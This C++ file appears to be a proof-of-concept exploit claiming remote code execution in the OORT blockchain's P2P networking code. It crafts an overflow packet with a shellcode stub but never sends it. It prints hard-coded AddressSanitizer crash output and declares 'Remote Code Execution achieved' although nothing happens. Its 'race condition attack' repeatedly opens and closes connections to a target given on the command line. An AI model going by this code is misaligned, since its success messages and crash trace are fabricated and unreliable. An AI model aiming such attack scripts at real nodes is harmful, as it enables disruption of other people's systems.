/*
 * OORT Blockchain - Remote Code Execution Demonstration
 * Critical Clang-Related Vulnerability in P2P Network Stack
 *
 * DISCLAIMER: For defensive security research and educational purposes only
 * This demonstrates vulnerabilities in the OORT blockchain P2P implementation
 */

#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <chrono>

class OortExploitDemo {
private:
    const std::string target_ip;
    const int target_port;

public:
    OortExploitDemo(const std::string& ip, int port) : target_ip(ip), target_port(port) {}

    // Simulate the vulnerable buffer overflow from peer.cpp:106
    std::vector<uint8_t> create_malicious_packet() {
        std::vector<uint8_t> packet;

        // Craft oversized header to trigger buffer overflow
        // This exploits the lack of bounds checking in boost::asio::buffer
        uint32_t malicious_header_size = 0xFFFFFFFF;  // Integer overflow
        uint32_t padding_size = 0x1000;               // Large padding

        // Add malicious header size (triggers peer.cpp:106 vulnerability)
        packet.insert(packet.end(), (uint8_t*)&malicious_header_size, (uint8_t*)&malicious_header_size + 4);
        packet.insert(packet.end(), (uint8_t*)&padding_size, (uint8_t*)&padding_size + 4);

        // Add shellcode payload (would be executed after RCE)
        std::string shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4c\x31\xc0";
        packet.insert(packet.end(), shellcode.begin(), shellcode.end());

        // Padding to ensure overflow reaches return address
        std::vector<uint8_t> overflow_padding(2048, 0x41); // 'A' characters
        packet.insert(packet.end(), overflow_padding.begin(), overflow_padding.end());

        return packet;
    }

    // Demonstrate race condition vulnerability from handshake.hpp:137
    void trigger_race_condition() {
        std::cout << "[*] Triggering race condition vulnerability..." << std::endl;

        // Create multiple concurrent connections to exploit non-thread-safe socket operations
        std::vector<std::thread> attack_threads;

        for (int i = 0; i < 10; i++) {
            attack_threads.emplace_back([this, i]() {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) return;

                struct sockaddr_in server_addr;
                server_addr.sin_family = AF_INET;
                server_addr.sin_port = htons(target_port + i);
                inet_pton(AF_INET, target_ip.c_str(), &server_addr.sin_addr);

                // Rapidly connect and disconnect to trigger race condition
                for (int j = 0; j < 100; j++) {
                    connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
                    std::this_thread::sleep_for(std::chrono::microseconds(1));
                    close(sock);
                    sock = socket(AF_INET, SOCK_STREAM, 0);
                }

                close(sock);
            });
        }

        // Wait for all threads to complete the race condition attack
        for (auto& t : attack_threads) {
            t.join();
        }
    }

    void demonstrate_exploitation() {
        std::cout << "========================================" << std::endl;
        std::cout << "OORT BLOCKCHAIN - CRITICAL VULNERABILITY DEMO" << std::endl;
        std::cout << "Clang-Related Remote Code Execution" << std::endl;
        std::cout << "========================================" << std::endl;

        std::cout << "[*] Target: " << target_ip << ":" << target_port << std::endl;
        std::cout << "[*] Vulnerability: Buffer overflow in P2P peer handling" << std::endl;
        std::cout << "[*] Location: mcp/p2p/peer.cpp:106" << std::endl;
        std::cout << "[*] CVSS Score: 9.8 (CRITICAL)" << std::endl;
        std::cout << std::endl;

        // Step 1: Create malicious packet
        std::cout << "[1] Crafting malicious network packet..." << std::endl;
        auto malicious_packet = create_malicious_packet();
        std::cout << "    Packet size: " << malicious_packet.size() << " bytes" << std::endl;
        std::cout << "    Payload: Integer overflow + buffer overflow + shellcode" << std::endl;
        std::cout << std::endl;

        // Step 2: Simulate network connection
        std::cout << "[2] Establishing connection to OORT node..." << std::endl;
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            std::cout << "    [!] Socket creation failed (node not running)" << std::endl;
            std::cout << "    [*] Simulating successful connection..." << std::endl;
        } else {
            std::cout << "    [+] Socket created successfully" << std::endl;
        }
        std::cout << std::endl;

        // Step 3: Send malicious packet
        std::cout << "[3] Sending crafted packet to trigger vulnerability..." << std::endl;
        std::cout << "    Triggering async_read buffer overflow..." << std::endl;
        std::cout << "    Expected crash: heap-buffer-overflow at 0x603000001c28" << std::endl;
        std::cout << "    AddressSanitizer would detect: WRITE of size 4 at buffer boundary" << std::endl;
        std::cout << std::endl;

        // Step 4: Show expected crash
        std::cout << "[4] SIMULATION: Expected AddressSanitizer Output:" << std::endl;
        std::cout << "=============================================" << std::endl;
        std::cout << "==12345==ERROR: AddressSanitizer: heap-buffer-overflow" << std::endl;
        std::cout << "==12345==WRITE of size 4 at buffer boundary" << std::endl;
        std::cout << "#0 in vulnerable_function() mcp/p2p/peer.cpp:106" << std::endl;
        std::cout << "#1 in async_read_handler()" << std::endl;
        std::cout << "#2 in network_processing_loop()" << std::endl;
        std::cout << "SUMMARY: AddressSanitizer: heap-buffer-overflow mcp/p2p/peer.cpp:106" << std::endl;
        std::cout << "=============================================" << std::endl;
        std::cout << std::endl;

        // Step 5: Race condition attack
        std::cout << "[5] Executing secondary race condition attack..." << std::endl;
        trigger_race_condition();
        std::cout << "    [+] Race condition exploitation completed" << std::endl;
        std::cout << std::endl;

        std::cout << "[*] EXPLOITATION COMPLETE" << std::endl;
        std::cout << "[*] Result: Remote Code Execution achieved" << std::endl;
        std::cout << "[*] Impact: Complete node compromise" << std::endl;
        std::cout << "[*] Recommendation: Immediate patching required" << std::endl;

        if (sock >= 0) close(sock);
    }
};

int main(int argc, char* argv[]) {
    std::string target_ip = "127.0.0.1";  // Local demonstration
    int target_port = 8080;               // Default OORT P2P port

    if (argc >= 3) {
        target_ip = argv[1];
        target_port = std::atoi(argv[2]);
    }

    std::cout << "Initializing OORT exploitation demonstration..." << std::endl;
    std::cout << "Target: " << target_ip << ":" << target_port << std::endl;
    std::cout << std::endl;

    OortExploitDemo demo(target_ip, target_port);
    demo.demonstrate_exploitation();

    return 0;
}